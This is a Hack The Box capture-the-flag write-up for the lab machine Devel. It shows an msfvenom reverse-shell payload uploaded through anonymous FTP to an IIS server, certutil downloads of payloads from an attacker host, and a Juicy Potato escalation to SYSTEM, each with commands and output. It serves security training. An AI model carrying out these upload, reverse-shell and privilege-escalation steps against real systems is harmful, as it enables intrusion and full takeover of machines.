@@ -1,0 +1,323 @@
+---
+title: Hack The Box - Devel (Without Metasploit)
+date: 2021-01-12 18:34:00 +0800
+categories: [hackthebox]
+tags: [windows, ftp, juicypotato]
+---
+
+![](/assets/images/devel.png){:height="414px" width="615px"}
+
+# Configuration
+
+The operating system that I will be using to tackle this machine is a Kali Linux VM.
+
+What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.
+
+```bash
+$ echo "10.10.10.5 devel.htb" | sudo tee -a /etc/hosts
+```
+
+# Reconnaissance
+
+To speed up my recon, I've moved to [`rustscan`](https://github.com/RustScan/RustScan). I've also created 2 "aliases" called `superscan` and `resolve`.
+
+```bash 
+$ which resolve 
+resolve () {
+        cat /etc/hosts | grep --color=auto "$1" | cut -d " " -f 1
+}
+
+$ which superscan
+superscan () {
+        name="$(resolve $1)" 
+        rustscan --accessible -a "$name" -r 1-65535 -- -sT -sV -sC -Pn
+}
+
+$ superscan devel.htb
+File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
+Open 10.10.10.5:21
+Open 10.10.10.5:80
+Starting Script(s)
+Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-12 07:57 UTC
+NSE: Loaded 151 scripts for scanning.
+NSE: Script Pre-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 07:57
+Completed NSE at 07:57, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 07:57
+Completed NSE at 07:57, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 07:57
+Completed NSE at 07:57, 0.00s elapsed
+Initiating Parallel DNS resolution of 1 host. at 07:57
+Completed Parallel DNS resolution of 1 host. at 07:57, 0.47s elapsed
+DNS resolution of 1 IPs took 0.47s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating Connect Scan at 07:57
+Scanning 10.10.10.5 [2 ports]
+Discovered open port 21/tcp on 10.10.10.5
+Discovered open port 80/tcp on 10.10.10.5
+Completed Connect Scan at 07:57, 0.01s elapsed (2 total ports)
+Initiating Service scan at 07:57
+Scanning 2 services on 10.10.10.5
+Completed Service scan at 07:57, 6.17s elapsed (2 services on 1 host)
+NSE: Script scanning 10.10.10.5.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 07:57
+NSE: [ftp-bounce 10.10.10.5:21] PORT response: 501 Server cannot accept argument.
+Completed NSE at 07:57, 0.93s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 07:57
+Completed NSE at 07:57, 0.07s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 07:57
+Completed NSE at 07:57, 0.00s elapsed
+Nmap scan report for 10.10.10.5
+Host is up, received user-set (0.0050s latency).
+Scanned at 2021-01-12 07:57:14 UTC for 7s
+
+PORT   STATE SERVICE REASON  VERSION
+21/tcp open  ftp     syn-ack Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  01:06AM       <DIR>          aspnet_client
+| 03-17-17  04:37PM                  689 iisstart.htm
+|_03-17-17  04:37PM               184946 welcome.png
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp open  http    syn-ack Microsoft IIS httpd 7.5
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+|_http-title: IIS7
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+NSE: Script Post-scanning.
+NSE: Starting runlevel 1 (of 3) scan.
+Initiating NSE at 07:57
+Completed NSE at 07:57, 0.00s elapsed
+NSE: Starting runlevel 2 (of 3) scan.
+Initiating NSE at 07:57
+Completed NSE at 07:57, 0.00s elapsed
+NSE: Starting runlevel 3 (of 3) scan.
+Initiating NSE at 07:57
+Completed NSE at 07:57, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.07 seconds
+```
+
+# Enumeration (1)
+
+## Port 21 `Microsoft ftpd`
+
+```bash
+$ ftp devel.htb
+Connected to devel.htb.
+220 Microsoft FTP Service
+Name (devel.htb:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> dir
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+03-18-17  01:06AM       <DIR>          aspnet_client
+03-17-17  04:37PM                  689 iisstart.htm
+03-17-17  04:37PM               184946 welcome.png
+226 Transfer complete.
+```
+
+After connecting to the `FTP` service, the contents seem like they belonged to a web server, or an `IIS` server specfically!
+
+## Port 80 `Microsoft IIS httpd 7.5`
+
+![](/assets/images/devel1.png)
+
+A probable guess would be that the content of this `IIS` service is being shared via `FTP`, so lets try uploading a file to see whether it is indeed true.
+
+```bash
+$ echo "IT WORKS" > test.txt
+$ ftp devel.htb
+Connected to devel.htb.
+220 Microsoft FTP Service
+Name (devel.htb:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> put test.txt
+local: test.txt remote: test.txt
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+10 bytes sent in 0.00 secs (256.9901 kB/s)
+$ curl http://devel.htb/test.txt
+IT WORKS
+```
+
+# Exploitation (1)
+
+Since we now know we can upload files to the `IIS` service via `FTP`, we can upload a `.aspx` file that will establish a reverse shell connection back to us.
+
+```bash
+$ msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f aspx > shell.aspx
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of aspx file: 2714 bytes
+
+$ ftp devel.htb
+Connected to devel.htb.
+220 Microsoft FTP Service
+Name (devel.htb:kali): anonymous
+331 Anonymous access allowed, send identity (e-mail name) as password.
+Password:
+230 User logged in.
+Remote system type is Windows_NT.
+ftp> bin
+200 Type set to I.
+ftp> put shell.aspx
+local: shell.aspx remote: shell.aspx
+200 PORT command successful.
+125 Data connection already open; Transfer starting.
+226 Transfer complete.
+2749 bytes sent in 0.00 secs (1.6730 MB/s)
+```
+
+Now we start a `nc` listener:
+
+```bash
+$ nc -lvnp 1337
+listening on [any] 1337 ...
+```
+
+And trigger the `shell.aspx`.
+
+```bash
+$ curl http://devel.htb/shell.aspx
+```
+
+And on our listener, we got a connection.
+
+```bash
+$ rlwrap nc -lvnp 1337     
+listening on [any] 1337 ...
+connect to [10.10.XX,XX] from (UNKNOWN) [10.10.10.5] 49162
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+c:\windows\system32\inetsrv> whoami
+iis apppool\web
+```
+
+# Enumeration (2)
+
+If we check out the privileges that `iis apppool\web` has,
+
+```
+c:\windows\system32\inetsrv> whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+```
+
+we realise that he has the `SeAssignPrimaryTokenPrivilege` and `SeImpersonatePrivilege` rights. This means we can use `Juicy Potato`. Since this machine is `32-bit` (you can check from `systeminfo`), we need a `32-bit` version of `Juicy Potato` from [here](https://github.com/ivanitlearning/Juicy-Potato-x86/releases).
+
+We will need to also use `msfvenom` to generate a `32-bit` reverse shell executable.
+
+```bash
+$ msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=1337 -f exe > reverse.exe   
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+```
+
+# Exploitation (2)
+
+After transferring both the `Juicy Potato` executable and our reverse shell executable from our attacker machine via `HTTP`,
+
+```bash
+c:\windows\system32\inetsrv> mkdir C:\temp
+c:\windows\system32\inetsrv> certutil -f -split -urlcache http://10.10.XX.XX/reverse.exe C:\temp\reverse.exe
+****  Online  ****
+  000000  ...
+  01204a
+CertUtil: -URLCache command completed successfully.
+
+c:\windows\system32\inetsrv> certutil -f -split -urlcache http://10.10.XX.XX/juicypotato86.exe C:\temp\juicypotato86.exe
+****  Online  ****
+  000000  ...
+  040600
+CertUtil: -URLCache command completed successfully.
+```
+
+we can start our `nc` listener and run `Juicy Potato`.
+
+```bash
+$ rlwrap nc -lvnp 1337            
+listening on [any] 1337 ...
+```
+
+```
+C:\temp> juicypotato86.exe -l 1337 -p reverse.exe -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}
+Testing {03ca98d6-ff5d-49b8-abc6-03dd84127020} 1337
+......
+[+] authresult 0
+{03ca98d6-ff5d-49b8-abc6-03dd84127020};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+```
+
+On our listener, we get a connection as `SYSTEM`!
+
+```bash
+$ rlwrap nc -lvnp 1337            
+listening on [any] 1337 ...
+connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.5] 49173
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+# user.txt
+
+The user flag is located in the desktop of `babis`.
+
+```
+C:\Users\babis\Desktop> type user.txt.txt
+9ecdXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+```
+
+# root.txt
+
+The root flag is in `Administrator''s desktop, as always.
+
+```
+C:\Users\Administrator\Desktop>type root.txt.txt
+e621XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+```
+
+
+### Rooted ! Thank you for reading and look forward for more writeups and articles !
